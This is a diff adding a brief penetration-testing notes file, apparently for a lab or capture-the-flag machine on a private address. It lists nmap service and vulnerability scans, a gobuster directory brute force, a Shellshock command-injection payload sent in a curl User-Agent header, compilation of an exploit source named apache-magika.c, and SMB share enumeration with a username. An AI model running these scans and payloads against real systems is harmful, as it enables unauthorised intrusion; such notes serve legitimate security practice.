@@ -1,0 +1,16 @@
+nmap 192.168.23.122 -sV -sC -Pn > nmap.txt
+nmap 192.168.23.122 -p- > nmapall.txt
+nmap --script vuln -sV -p 135,139,445,12000 -Pn 192.168.23.122   > nmapvuln.txt
+
+gobuster dir  -u http://192.168.23.122:12000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php  > gobuster.txt
+
+
+
+curl -A "() { :;};echo; whoami " http://192.168.23.122/
+
+
+gcc apache-magika.c -o apache-magika -lssl
+
+smbclient -L //192.168.23122 -U undeaddev
+
+undeaddev
